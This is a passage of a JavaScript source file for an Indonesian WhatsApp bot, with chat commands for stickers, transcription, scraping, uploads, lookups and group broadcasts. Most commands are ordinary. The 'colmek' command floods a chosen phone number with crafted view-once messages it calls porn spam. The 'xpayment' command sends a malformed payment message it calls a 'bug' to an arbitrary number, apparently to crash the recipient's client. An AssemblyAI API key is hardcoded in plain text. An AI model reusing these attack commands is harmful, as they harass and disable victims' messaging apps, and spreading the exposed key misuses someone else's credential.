 m.reply('Terjadi kesalahan.');
 }
}
break
case 'qc': {
 try {
 if (!q) return m.reply(`pesan nya?`);

 // Fungsi untuk mengambil profil avatar
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0];
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return { attrs: { url: 'https://telegra.ph/file/0b113db9d9e244ea22c81.jpg' } };
 }
 }

 const { createCanvas, loadImage } = require('canvas');
 const fs = require('fs');
 const path = require('path');
 const moment = require('moment-timezone'); // Pastikan moment-timezone terpasang

 const canvasWidth = 600;
 const canvasHeight = 220; // Menambah tinggi untuk menampung waktu di dalam bubble
 const avatarSize = 80;
 const bubblePadding = 20;

 // Ambil nama dan pesan
 const message = q.trim();
 if (!message) return m.reply(`Format yang benar: ${prefix + command} "Pesan"`);

 // Ambil nama pengirim dan avatar image menggunakan getPp
 const name = await sky.getName(m.sender);
 const target = m.sender;
 const avatarData = await getPp(sky, target);
 const avatarUrl = avatarData.attrs.url;
 const avatarImg = await loadImage(avatarUrl);

 // Buat canvas
 const canvas = createCanvas(canvasWidth, canvasHeight);
 const ctx = canvas.getContext('2d');

 // Background transparent
 ctx.clearRect(0, 0, canvasWidth, canvasHeight);

 // Draw chat bubble
 ctx.fillStyle = '#ffffff';
 ctx.strokeStyle = '#cccccc';
 ctx.lineWidth = 2;
 ctx.roundRect(avatarSize + bubblePadding + 10, bubblePadding, canvasWidth - avatarSize - bubblePadding * 2 - 10, canvasHeight - bubblePadding * 2, 20);
 ctx.fill();
 ctx.stroke();

 // Draw avatar
 ctx.save();
 ctx.beginPath();
 ctx.arc(avatarSize / 2 + bubblePadding, canvasHeight / 2, avatarSize / 2, 0, Math.PI * 2, true);
 ctx.closePath();
 ctx.clip();
 ctx.drawImage(avatarImg, bubblePadding, (canvasHeight - avatarSize) / 2, avatarSize, avatarSize);
 ctx.restore();

 // Random color for the name
 const colors = ['#B833FF', '#FF5733', '#5733FF'];
 const randomColor = colors[Math.floor(Math.random() * colors.length)];

 // Draw name with the selected random color
 const nameX = avatarSize + bubblePadding * 2 + 10;
 const nameY = bubblePadding + 10;
 ctx.fillStyle = randomColor;
 ctx.font = 'bold 25px Arial';
 ctx.textAlign = 'left';
 ctx.textBaseline = 'top';
 ctx.fillText(name, nameX, nameY);

 // Gunakan font yang mendukung emoji untuk teks pesan
 ctx.fillStyle = '#000000';
 ctx.font = 'bold 30px "Noto Color Emoji", Arial'; // Tambahkan font Noto Color Emoji
 ctx.textBaseline = 'middle';
 const textX = avatarSize + bubblePadding * 2 + 10;
 const textY = canvasHeight / 2;
 const maxTextWidth = canvasWidth - avatarSize - bubblePadding * 3 - 10;

 const wrappedText = wrapText(ctx, message, maxTextWidth);
 wrappedText.forEach((line, index) => {
 ctx.fillText(line, textX, textY - (wrappedText.length - 1) * 14 + index * 28);
 });

 // Draw time inside the bubble
 const time = moment().tz('Asia/Jakarta').format('HH:mm');
 ctx.fillStyle = '#000000'; // Color black
 ctx.font = 'italic 20px Arial';
 ctx.textAlign = 'right';
 ctx.textBaseline = 'bottom';
 const timeX = canvasWidth - bubblePadding - 10;
 const timeY = canvasHeight - bubblePadding - 10;
 ctx.fillText(time, timeX, timeY);

 const outputPath = path.join(__dirname, 'chatbubble.png');
 const out = fs.createWriteStream(outputPath);
 const stream = canvas.createPNGStream();
 stream.pipe(out);

 out.on('finish', async () => {
 await sky.sendImageAsSticker(m.chat, outputPath, m, { packname: global.packname, author: global.author });
 fs.unlinkSync(outputPath); // Menghapus file setelah dikirim
 });

 // Fungsi untuk membungkus teks agar sesuai dengan lebar maksimal
 function wrapText(ctx, text, maxWidth) {
 const words = text.split(' ');
 const lines = [];
 let currentLine = words[0];

 for (let i = 1; i < words.length; i++) {
 const word = words[i];
 const width = ctx.measureText(currentLine + ' ' + word).width;
 if (width < maxWidth) {
 currentLine += ' ' + word;
 } else {
 lines.push(currentLine);
 currentLine = word;
 }
 }
 lines.push(currentLine);
 return lines;
 }

 } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan dalam membuat chat bubble.');
 }
}
break
case 'totext': {
 const fs = require('fs');
 const axios = require('axios');
 const { AssemblyAI } = require('assemblyai');
 const path = require('path');

 // Inisialisasi client AssemblyAI
 const client = new AssemblyAI({
 apiKey: '08417d03bdee45d191b301b75ed3d7a6',
 });

 try {
 // Unduh dan simpan file audio
 const filePath = await sky.downloadAndSaveMediaMessage(m.quoted);
 const audioBuffer = fs.readFileSync(filePath);

 // Upload file audio ke AssemblyAI
 const uploadResponse = await axios.post(
 'https://api.assemblyai.com/v2/upload',
 audioBuffer,
 {
 headers: {
 'authorization': client.apiKey,
 'content-type': 'audio/mpeg',
 },
 }
 );

 const audioUrl = uploadResponse.data.upload_url;

 // Kirimkan permintaan transkripsi
 const transcriptConfig = {
 audio_url: audioUrl,
 };
 const transcriptResponse = await client.transcripts.transcribe(transcriptConfig);

 // Tunggu hingga transkripsi selesai
 let status = 'queued';
 let transcriptText = 'Transkripsi belum tersedia.';
 while (status === 'queued' || status === 'processing') {
 await new Promise(resolve => setTimeout(resolve, 5000)); // Tunggu 5 detik
 const statusResponse = await client.transcripts.get(transcriptResponse.id);
 status = statusResponse.status;
 transcriptText = statusResponse.text || transcriptText;
 }

 if (status === 'completed') {
 m.reply(`Transkripsi audio:\n${transcriptText}`);
 } else {
 m.reply('Terjadi kesalahan saat mendapatkan transkripsi.');
 }

 // Hapus file audio setelah proses selesai
 fs.unlinkSync(filePath);

 } catch (error) {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat mengubah audio menjadi teks.');
 }
}
break
case 'rangkum': {
 if (!q) return m.reply(`Masukkan kalimat Yang Mau di rangkum`);
// wm avs
 const sentences = `${q}`.match(/[^.!?]+[.!?]/g) || [];
// wm avs
 const wordFrequency = {};
 sentences.forEach(sentence => {
 const words = sentence.toLowerCase().split(/\s+/);
 words.forEach(word => {
 word = word.replace(/[.,!?]/g, '');
 if (word.length > 0) {
 if (wordFrequency[word]) {
 wordFrequency[word]++;
 } else {
 wordFrequency[word] = 1;
 }
 }
 });
 });
// wm avs
 const sortedWords = Object.keys(wordFrequency).sort((a, b) => wordFrequency[b] - wordFrequency[a]);
// wm avs
 const summarySentences = sentences
 .filter(sentence => {
 const words = sentence.toLowerCase().split(/\s+/).map(word => word.replace(/[.,!?]/g, ''));
 return words.some(word => sortedWords.includes(word));
 })
 .slice(0, 3);
// wm avs
 const summary = summarySentences.join(' ');
// wm avs
 m.reply(summary || "Gagal merangkum teks.");
}
break
case 'bcgc': case 'bcgroup': {
if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik')
 if (!isCreator) throw mess.owner
 if (!text) throw `Text mana?\n\nExample : ${prefix + command} avz`
 let getGroups = await sky.groupFetchAllParticipating()
 let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
 let anu = groups.map(v => v.id)
 m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
 for (let i of anu) {
 await sleep(1500)
 let txt = `「 Broadcast Bot 」\n\n${text}`
 sky.sendText(i, txt)
 }
 m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
 }
 break
case 'matauang': {
 const axios = require('axios');

 async function getCurrency(country) {
 try {
 const url = `https://restcountries.com/v3.1/name/${encodeURIComponent(country)}?fullText=true`;
 const { data } = await axios.get(url);

 if (data && data.length > 0) {
 const countryData = data[0];
 const countryName = countryData.name.common;
 const currencies = countryData.currencies;
 const currencyNames = Object.values(currencies).map(curr => curr.name).join(', ');

 return `Mata uang di ${countryName} adalah ${currencyNames}`;
 } else {
 return "Maaf, data negara tidak ditemukan.";
 }
 } catch (error) {
 console.error('Error:', error);
 return "Terjadi kesalahan saat mengambil data. Pastikan nama negara yang dimasukkan benar.";
 }
 }

 const country = m.text.split(' ').slice(1).join(' '); // Mengambil nama negara dari input

 if (!country) {
 m.reply("Silakan masukkan nama negara setelah perintah, contoh: matauang indonesia");
 } else {
 getCurrency(country).then(response => {
 m.reply(response);
 }).catch(error => {
 m.reply("Terjadi kesalahan saat memproses permintaan Anda.");
 });
 }
}
break
case 'bahasa': {
 const axios = require('axios');

 async function getCountryLanguage(country) {
 try {
 const url = `https://restcountries.com/v3.1/name/${encodeURIComponent(country)}?fullText=true`;
 const { data } = await axios.get(url);

 if (data && data.length > 0) {
 const countryData = data[0];
 const countryName = countryData.name.common;
 const languages = Object.values(countryData.languages).join(', ');

 return `Bahasa yang digunakan di ${countryName} adalah: ${languages}`;
 } else {
 return "Maaf, data negara tidak ditemukan.";
 }
 } catch (error) {
 console.error('Error:', error);
 return "Terjadi kesalahan saat mengambil data bahasa.";
 }
 }

 const country = m.text.split(' ').slice(1).join(' '); // Mengambil nama negara dari input

 if (!country) {
 m.reply("Silakan masukkan nama negara setelah perintah, contoh: bahasa indonesia");
 } else {
 getCountryLanguage(country).then(response => {
 m.reply(response);
 }).catch(error => {
 m.reply("Terjadi kesalahan saat memproses permintaan Anda.");
 });
 }
}
break
case 'yahoosearch': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!text) throw `Example : ${prefix + command} avosky`;
 
 let axios = require('axios');
 let cheerio = require('cheerio');
 
 axios.get(`https://search.yahoo.com/search?p=${encodeURIComponent(text)}`)
 .then(response => {
 let $ = cheerio.load(response.data);
 let results = [];
 
 $('.dd.algo').each((i, elem) => {
 let title = $(elem).find('h3').text();
 let link = $(elem).find('a').attr('href');
 let snippet = $(elem).find('.compText').text();
 
 if (title && link) {
 results.push({ title, link, snippet });
 }
 });
 
 if (results.length === 0) return m.reply('Tidak ada hasil yang ditemukan.');
 
 let teks = `Yahoo Search From : ${text}\n\n`;
 for (let i = 0; i < Math.min(results.length, 5); i++) { // Batasi hasil ke 5
 let res = results[i];
 teks += `⭔ *Title* : ${res.title}\n`;
 teks += `⭔ *Description* : ${res.snippet}\n`;
 teks += `⭔ *Link* : ${res.link}\n\n────────────────────────\n\n`;
 }
 m.reply(teks);
 })
 .catch(err => {
 m.reply('Terjadi kesalahan saat melakukan pencarian.');
 console.error(err);
 });
}
break;
case 'infoclub': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!text) throw `Example : ${prefix + command} Manchester United`;
 
 let axios = require('axios');
 let cheerio = require('cheerio');
 
 axios.get(`https://www.bola.com/search?q=${encodeURIComponent(text)}`)
 .then(response => {
 let $ = cheerio.load(response.data);
 let results = [];
 
 $('.article__list').each((i, elem) => {
 let title = $(elem).find('.article__title').text();
 let link = $(elem).find('a').attr('href');
 let snippet = $(elem).find('.article__snippet').text();
 
 if (title && link) {
 results.push({ title, link, snippet });
 }
 });
 
 if (results.length === 0) return m.reply('Tidak ada hasil yang ditemukan.');
 
 let teks = `Info Club From : ${text}\n\n`;
 for (let i = 0; i < Math.min(results.length, 5); i++) { // Batasi hasil ke 5
 let res = results[i];
 teks += `⭔ *Title* : ${res.title}\n`;
 teks += `⭔ *Description* : ${res.snippet}\n`;
 teks += `⭔ *Link* : ${res.link}\n\n────────────────────────\n\n`;
 }
 m.reply(teks);
 })
 .catch(err => {
 m.reply('Terjadi kesalahan saat melakukan pencarian.');
 console.error(err);
 });
}
break
case 'crypto': {
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!text) throw `Example : ${prefix + command} Bitcoin`;
 
 let axios = require('axios');
 
 axios.get(`https://api.coingecko.com/api/v3/coins/markets`, {
 params: {
 vs_currency: 'usd',
 ids: text.toLowerCase()
 }
 })
 .then(response => {
 if (response.data.length === 0) return m.reply('Tidak ada hasil yang ditemukan.');
 
 let coin = response.data[0];
 let teks = `Crypto Info for: ${coin.name}\n\n`;
 teks += `⭔ *Symbol* : ${coin.symbol.toUpperCase()}\n`;
 teks += `⭔ *Current Price* : $${coin.current_price}\n`;
 teks += `⭔ *Market Cap* : $${coin.market_cap}\n`;
 teks += `⭔ *24h High* : $${coin.high_24h}\n`;
 teks += `⭔ *24h Low* : $${coin.low_24h}\n`;
 teks += `⭔ *Price Change 24h* : ${coin.price_change_percentage_24h}%\n`;
 teks += `⭔ *Last Updated* : ${coin.last_updated}\n\n`;
 
 m.reply(teks);
 })
 .catch(err => {
 m.reply('Terjadi kesalahan saat mengambil data.');
 console.error(err);
 });
}
break
case 'gpts': {
 if (!q) {
 m.reply("Mau tanya apa kak?");
 break;
 }
// wm avs
 const fetchSuppInfo = async () => {
 try {
 const response = await fetch("https://chatgptss.org");
 const html = await response.text();
 const $ = cheerio.load(html);
 return $(".wpaicg-chat-shortcode")
 .map((index, element) => Object.fromEntries(Object.entries(element.attribs)))
 .get();
 } catch (error) {
 console.error("Failed to fetch support info:", error.message);
 throw new Error("Error fetching support info.");
 }
 };
// wm avs
 const sendMessageToGPT = async (message, info) => {
 const formData = new FormData();
 formData.append("_wpnonce", info[0]["data-nonce"]);
 formData.append("post_id", info[0]["data-post-id"]);
 formData.append("action", "wpaicg_chatbox_message");
 formData.append("message", message);
// wm avs
 try {
 const response = await fetch("https://chatgptss.org/wp-admin/admin-ajax.php", {
 method: "POST",
 body: formData
 });
// wm avs
 if (!response.ok) throw new Error("Network response was not ok");
// wm avs
 return await response.json();
 } catch (error) {
 console.error("Failed:", error.message);
 throw new Error("Error");
 }
 };
// wm avs
 const processGPTResponse = async (query) => {
 try {
 const supportInfo = await fetchSuppInfo();
 const gptResponse = await sendMessageToGPT(query, supportInfo);
// wm avs
 if (gptResponse.status === 'success') {
 m.reply(gptResponse.data);
 } else {
 m.reply("Sekarang Belum Bisa.");
 }
 } catch (error) {
 console.error("eee:", error.message);
 m.reply("Maaf, terjadi kesalahan saat mencoba berkomunikasi dengan AI Sedang Ada Hambatan.");
 }
 };
// wm avs
 processGPTResponse(q);
 }
 break
case 'igstalk': {
 if (!q) return m.reply("Masukkan username Instagram yang ingin dicari.");

 async function igStalk2(username) {
 try {
 const { data, status } = await axios.get(`https://snapinst.com/api/ig/userInfoByUsername/${username}`);
 let pronoun = data.result.user.pronouns.length === 0 ? "" : data.result.user.pronouns.join("/");
 const res = data.result.user;
 const result = {
 status: true,
 creator: "Thoriq Azzikra",
 username: res.username,
 fullName: res.full_name,
 followers: res.follower_count,
 following: res.following_count,
 pronouns: pronoun,
 verified: res.is_verified,
 private: res.is_private,
 totalPosts: res.media_count,
 bio: res.biography,
 externalUrl: res.external_url,
 urlAcc: `https://instagram.com/${username}`,
 profilePic: res.hd_profile_pic_url_info.url,
 pkId: res.pk_id
 };
 return result;
 } catch (err) {
 return {
 status: false,
 creator: "Avoskyz",
 message: "Tidak dapat menemukan akun"
 };
 }
 }

 const username = q;
 const result = await igStalk2(username);

 if (result.status) {
 const caption = `
 *Username:* ${result.username}
 *Nama Lengkap:* ${result.fullName}
 *Followers:* ${result.followers}
 *Following:* ${result.following}
 *Pronouns:* ${result.pronouns || "Tidak ada"}
 *Verified:* ${result.verified ? "Ya" : "Tidak"}
 *Private:* ${result.private ? "Ya" : "Tidak"}
 *Total Posts:* ${result.totalPosts}
 *Bio:* ${result.bio || "Tidak ada"}
 *URL Akun:* ${result.urlAcc}
 `;
sky.sendMessage(m.chat, { image: { url: result.profilePic }, caption: caption }, { quoted: m });
 } else {
 m.reply(result.message);
 }
}
break

case 'colmek':{
 if (!isPrem) return replyprem(mess.premium)
if (!args[0]) return m.reply(`Use ${prefix+command} Number|Nominal\nExample ${prefix+command} 62xxxxxxxxxx|5`) 
sky.sendMessage(m.chat, { react: { text: '🕐', key: m.key }})
yapit = text.split("|")[0]+"@s.whatsapp.net"
amount = text.split("|")[1]
for (let i = 0; i < amount; i++) {
sky.relayMessage(yapit, {
extendedTextMessage: {
text: "nick.nnn",
thumbnailDirectPath: "https://lol.devorsixcore.ml/viewonce",
thumbnailSha256: "COLMEK",
thumbnailEncSha256: "COLMEK",
mediaKey: "COLMEK",
viewOnce: true
}
}, {});
}await sky.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
m.reply(`*\`Succes\`* Spam Bokep Ke ${yapit}\n_Target sudah di pastikan crot_`)
}
break
case 'xpayment': {
 let phoneNumber = `${q}`
 console.log("Processed phoneNumber:", phoneNumber); // Logging processed phone number

 if (phoneNumber.startsWith('0')) return m.reply("Example: ." + command + " 6283873664160");

 var isOnWhatsApp = await sky.onWhatsApp(phoneNumber + "@s.whatsapp.net");
 let waNumber = phoneNumber + "@s.whatsapp.net";
 const excludedNumbers = ["916909137213", "919366316008", "919402104403"];
 if (excludedNumbers.includes(phoneNumber)) return;

 if (isOnWhatsApp.length === 0) return m.reply("The number is not registered on WhatsApp");
 
 async function sendPaymentInfo(jid) {
 const paymentInfo = {
 message: {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 nativeFlowMessage: {
 buttons: [{
 name: "payment_info",
 buttonParamsJson: JSON.stringify({
 currency: "BRL",
 total_amount: { value: 0, offset: 100 },
 reference_id: "4P46GMY57GC",
 type: "physical-goods",
 order: {
 status: "pending",
 subtotal: { value: 0, offset: 100 },
 order_type: "ORDER",
 items: [{
 name: "",
 amount: { value: 0, offset: 100 },
 quantity: 0,
 sale_amount: { value: 0, offset: 100 }
 }]
 },
 payment_settings: [{
 type: "pix_static_code",
 pix_static_code: {
 merchant_name: "meu ovo",
 key: "+5533998586057",
 key_type: "X"
 }
 }]
 })
 }]
 }
 }
 }
 }
 }
 };
 await sky.relayMessage(jid, paymentInfo, { 'participant': { 'jid': jid } });
 }

 await sendPaymentInfo(waNumber);
 m.reply("Successfully Sent Bug To @" + phoneNumber + " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", [waNumber]);
}
break


case 'decrypt': {
let teks
if (m.quoted) {
 teks = m.quoted ? m.quoted.text : text
} else if (text) {
teks = text ? text : text
} else return m.reply(`Masukan codenya!`)
	try {
 const webcrack = require('webcrack');
		let result = await webcrack(teks);
		m.reply(result.code)
	} catch (e) {
		console.log(e)
		m.reply("Error kak!")
	}
}
break
case 'ssw': {
const puppeteer = require('puppeteer');

 // Mengecek apakah pengguna memasukkan URL
 if (!q) return m.reply('Silakan masukkan URL yang ingin diambil screenshot-nya.');

 // Fungsi untuk mengambil screenshot menggunakan Puppeteer
 async function takeScreenshot(url) {
 // Meluncurkan browser
 const browser = await puppeteer.launch();
 // Membuka tab baru di browser
 const page = await browser.newPage();
 
 // Mengunjungi halaman yang diberikan
 await page.goto(url, { waitUntil: 'networkidle2' });

 // Mengambil screenshot halaman
 const screenshotBuffer = await page.screenshot();

 // Menutup browser
 await browser.close();

 // Mengembalikan buffer screenshot
 return screenshotBuffer;
 }

 // Memanggil fungsi takeScreenshot dan mengirimkan hasilnya sebagai gambar
 takeScreenshot(q)
 .then(buffer => {
 m.reply('Screenshot berhasil diambil!');
 sky.sendMessage(m.chat, { image: buffer, caption: 'Ini adalah screenshot dari URL yang diberikan.' });
 })
 .catch(err => {
 console.error(err);
 m.reply('Gagal mengambil screenshot. Pastikan URL yang diberikan benar dan dapat diakses.');
 })
}
break

case 'runtime': {
const os = require('os');
const fs = require('fs');

 if (isBan) {
 return m.reply('Lu Di Ban Owner Gausa So Asik');
 }
const totalFitur2 = () => {
 const mytext = fs.readFileSync("./sky2.js").toString();
 const numUpper = (mytext.match(/case '/g) || []).length;
 return numUpper;
};

 const formatRuntime = (uptime) => {
 const days = Math.floor(uptime / (24 * 3600));
 uptime %= (24 * 3600);
 const hours = Math.floor(uptime / 3600);
 uptime %= 3600;
 const minutes = Math.floor(uptime / 60);
 const seconds = Math.floor(uptime % 60);
 return `${days} hari ${hours} jam ${minutes} menit ${seconds} detik`;
 };

 const getDateInJakarta = () => {
 const options = {
 timeZone: 'Asia/Jakarta',
 year: 'numeric',
 month: '2-digit',
 day: '2-digit',
 hour: '2-digit',
 minute: '2-digit',
 second: '2-digit',
 hour12: false
 };
 return new Intl.DateTimeFormat('id-ID', options).format(new Date());
 };

 const formatBytes = (bytes, decimals = 2) => {
 if (bytes === 0) return '0 Byte';
 const k = 1024;
 const dm = decimals < 0 ? 0 : decimals;
 const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
 const i = Math.floor(Math.log(bytes) / Math.log(k));
 return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
 };

 const responseTime = Math.floor(performance.now());
 const runtime = formatRuntime(process.uptime());
 const totalMemory = formatBytes(os.totalmem());
 const freeMemory = formatBytes(os.freemem());
 const cpuLoad = os.loadavg()[0].toFixed(2); // Load average for the last 1 minute
 const fiturCount = totalFitur();
 const fiturCount2 = totalFitur2();

 let response = `
\`\`\`
Runtime: ${runtime}
Response Time: ${responseTime} milidetik
Date: ${getDateInJakarta()}
Total Memory: ${totalMemory}
Free Memory: ${freeMemory}
CPU Load : ${cpuLoad}%
Total Fitur di Sky: ${fiturCount}
Total Fitur di Sky2: ${fiturCount2}
\`\`\`
 `.trim();

 m.reply(response);
}
break
case 'drakor': {
 if (!text) {
 throw 'Contoh: Drakor The Red Sleeve';
 }
 m.reply('Mencari informasi drama Korea...');
 try {
 const url = `https://mydramalist.com/search?q=${encodeURIComponent(q)}`;
 const response = await axios.get(url);
 const $ = cheerio.load(response.data);
 const judul = $('.title').first().text().trim();
 const konten = $('.content').first().find('p').map((i, el) => $(el).text().trim()).get().join('\n\n');
 const link = $('.title').first().find('a').attr('href');
 
 if (!konten) {
 throw new Error('Tidak ada informasi yang ditemukan.');
 }
 
 const artikel = `*Judul:* ${judul}\n\n*Konten:* ${konten}\n\n*Link:* https://mydramalist.com${link}`;
 m.reply(artikel);
 } catch (error) {
 m.reply(`Maaf, terjadi kesalahan: ${error.message}`);
 }
}
break
case 'screps': {
m.reply(`coba kamu cek web ini 

https://ypia.or.id/?s=

lalu pelajari struktur html nya lalu kamu buatkan aku kode javascript untuk mencari sesuatu menggunakan scrape web nya buat dengan cheerio dan buat dengan benar 100%`)
}
break
case 'getlogo': {
const axios = require('axios');
const cheerio = require('cheerio');
const url = require('url');

 const query = 'avosky'; // Ganti dengan query yang sesuai
 const pageUrl = `https://www.textgiraffe.com/Name-Generator?text=${query}`;

 async function getLogoUrl() {
 try {
 // Mengambil HTML dari halaman
 const { data } = await axios.get(pageUrl);
 
 // Memuat HTML ke Cheerio
 const $ = cheerio.load(data);
 
 // Mencari gambar pertama dengan ekstensi .png
 const imgElement = $('img').filter(function() {
 return $(this).attr('src').endsWith('.png');
 }).first();
 
 if (imgElement.length) {
 // Mengambil atribut src
 let logoUrl = imgElement.attr('src');
 
 // Mengonversi relative URL menjadi absolute URL jika diperlukan
 if (!logoUrl.startsWith('http')) {
 logoUrl = url.resolve('https://www.textgiraffe.com', logoUrl);
 }
 
 // Mengirim URL logo sebagai balasan
 m.reply(`URL Logo: ${logoUrl}`);
 } else {
 m.reply('Gambar PNG tidak ditemukan.');
 }
 } catch (error) {
 // Menangani error dan mengirim pesan error
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
 }

 getLogoUrl();
}
break
case 'npmclone': {
 const input = args[0];

 if (!input) {
 return m.reply('Tolong berikan nama paket npm atau URL.');
 }

 // Function to extract package name from URL
 function extractPackageNameFromUrl(url) {
 const match = url.match(/https:\/\/www\.npmjs\.com\/package\/([^/]+)/);
 return match ? match[1] : null;
 }

 // Function to search for npm package details
 async function npmSearch(query) {
 try {
 const response = await axios.get(`https://registry.npmjs.org/${query}`);
 const { name, description } = response.data;
 const version = response.data['dist-tags'].latest;
 const packageLink = `https://www.npmjs.com/package/${name}`;
 const lastSlashIndex = name.lastIndexOf('/');
 const packageName = lastSlashIndex !== -1 ? name.substring(lastSlashIndex + 1) : name;
 const downloadLink = `https://registry.npmjs.org/${name}/-/${packageName}-${version}.tgz`;

 const npmPackageResponse = await axios.get(packageLink);
 const $ = cheerio.load(npmPackageResponse.data);
 const publishedDate = $('time').first().text();
 const owner = response.data.maintainers[0].name;
 const keywords = response.data.keywords;
 const homepage = response.data.homepage;
 const license = response.data.license;
 const dependencies = response.data.dependencies;
 const readme = $('div[class="markdown"]').html();

 return {
 name,
 description,
 version,
 packageLink,
 packageName,
 downloadLink,
 publishedDate,
 owner,
 keywords,
 homepage,
 license,
 dependencies,
 readme
 };
 } catch (err) {
 throw new Error('Kesalahan saat mencari informasi tentang paket');
 }
 }

 // Determine if the input is a URL or package name
 const packageName = extractPackageNameFromUrl(input) || input;

 try {
 const packageInfo = await npmSearch(packageName);
 const { downloadLink, packageName: pkgName } = packageInfo;

 sky.sendMessage(m.chat, { document: { url: downloadLink }, fileName: `${pkgName}.tgz`, mimetype: 'application/gzip' }, { quoted: m })
 .catch((err) => {
 console.error(err); // Log the error for debugging
 m.reply('Terjadi kesalahan saat mengunduh paket.');
 });
 } catch (error) {
 m.reply(error.message);
 }
}
break

case 'catbox': {
 const axios = require('axios');
 const FormData = require('form-data');
 const fs = require('fs');
 m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

 // Fungsi untuk mengunggah file ke Catbox
 async function uploadToCatbox(filePath) {
 try {
 if (!fs.existsSync(filePath)) {
 throw new Error("File not found");
 }

 const form = new FormData();
 form.append('reqtype', 'fileupload');
 form.append('fileToUpload', fs.createReadStream(filePath));

 const response = await axios.post('https://catbox.moe/user/api.php', form, {
 headers: {
 ...form.getHeaders()
 }
 });

 if (response.status === 200 && response.data) {
 return response.data.trim(); // Mengembalikan URL file yang diunggah
 } else {
 throw new Error(`Upload failed with status: ${response.status}`);
 }
 } catch (err) {
 throw new Error(`Upload failed: ${err.message}`);
 }
 }

 try {
 // Mengunduh dan menyimpan media dari pesan
 let media = await sky.downloadAndSaveMediaMessage(qmsg);

 // Mengecek apakah tipe media adalah gambar
 if (/image/.test(mime) || /video/.test(mime) || /audio/.test(mime)) {
 let url = await uploadToCatbox(media);
 m.reply(`${url}`);
 } else {
 m.reply(`Maaf, hanya gambar, video, atau audio yang dapat diunggah.`);
 }

 // Menghapus file setelah diunggah
 await fs.unlinkSync(media);
 } catch (err) {
 m.reply(`Error: ${err.message}`);
 }
}
break
case 'tourl1': {
 m.reply(mess.wait); // Mengirim pesan 'wait' sementara proses berlangsung

 // Fungsi untuk membuat FormData
 async function createFormData(filePath, name) {
 const form = new FormData();
 form.append(name, fs.createReadStream(filePath));
 return form;
 }

 // Fungsi untuk menangani respons error
 function handleErrorResponse(error) {
 console.error("Upload failed:", error);
 return `Error: ${error.message}`;
 }

 // Fungsi utama untuk mengunggah file ke Upload.ee
 async function UploadEE(filePath) {
 try {
 const baseUrl = "https://www.upload.ee";
 
 // Mengambil link upload
 const response = await axios.get(`${baseUrl}/ubr_link_upload.php?rnd_id=${Date.now()}`);
 const uploadId = (response.data.match(/startUpload\("(.+?)"/) || [])[1];
 if (!uploadId) throw new Error("Unable to obtain Upload ID");

 // Menyiapkan FormData
 const formData = await createFormData(filePath, "upfile_0");
 formData.append("link", "");
 formData.append("email", "");
 formData.append("category", "cat_file");
 formData.append("big_resize", "none");
 formData.append("small_resize", "120x90");

 // Mengunggah file
 const uploadResponse = await axios.post(`${baseUrl}/cgi-bin/ubr_upload.pl?X-Progress-ID=${encodeURIComponent(uploadId)}&upload_id=${encodeURIComponent(uploadId)}`, formData, {
 headers: {
 ...formData.getHeaders(),
 Referer: baseUrl
 }
 });

 // Mendapatkan URL file
 const firstData = uploadResponse.data;
 const $ = cheerio.load(firstData);
 const viewUrl = $("input#file_src").val() || "";
 if (!viewUrl) throw new Error("File upload failed");

 const viewResponse = await axios.get(viewUrl);
 const finalData = viewResponse.data;
 const downUrl = cheerio.load(finalData)("#d_l").attr("href") || "";
 if (!downUrl) throw new Error("File upload failed");

 return downUrl;
 } catch (error) {
 return handleErrorResponse(error);
 }
 }

 try {
 // Mengunduh dan menyimpan media dari pesan
 let media = await sky.downloadAndSaveMediaMessage(qmsg);

 // Mengunggah file dan mendapatkan URL
 let url = await UploadEE(media);
 m.reply(util.format(url));

 // Menghapus file setelah diunggah
 await fs.unlinkSync(media);
 } catch (err) {
 m.reply(`Error: ${err.message}`);
 }
}
break




case 'gnew': {
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function searchGoogleNews(query) {
 try {
 const response = await axios.get(`https://news.google.com/search`, {
 params: { q: query }
 });
 const html = response.data;
 const $ = cheerio.load(html);
 
 let results = [];
 $('article').each((index, element) => {
 const title = $(element).find('h3').text();
 let link = $(element).find('a').attr('href');
 const description = $(element).find('.xBbh9').text();

 // Pastikan link selalu menggunakan format https://
 if (link && link.startsWith('./')) {
 link = `https://news.google.com${link.slice(1)}`;
 } else if (link && link.startsWith('/')) {
 link = `https://news.google.com${link}`;
 }

 results.push({
 title: title,
 link: link,
 description: description
 });
 });
 
 return results.slice(0, 5); // Mengambil 5 hasil pertama
 } catch (error) {
 console.error(error);
 return [];
 }
 }

 const query = m.text.split(' ').slice(1).join(' '); // Ambil teks setelah perintah
 searchGoogleNews(query).then(results => {
 if (results.length > 0) {
 let message = 'Hasil pencarian Google News:\n\n';
 results.forEach(result => {
 message += `*${result.title}*\n${result.description}\n${result.link}\n\n`;
 });
 m.reply(message);
 } else {
 m.reply('Tidak ada hasil yang ditemukan.');
 }
 });
}
break

case 'bcdb': {
 if (!q) return m.reply(`Teks mana?\n\nExample : ${prefix + command} Pesan | 10 | 5`)
 if (isBan) return m.reply('Lu Di Ban Owner Gausa So Asik');
 if (!isCreator) throw mess.owner;

 const [message, numberOfRecipients, delay] = text.split('|').map(part => part.trim()); 
 if (!numberOfRecipients || isNaN(numberOfRecipients)) throw `Jumlah orang yang diinginkan harus berupa angka.`;
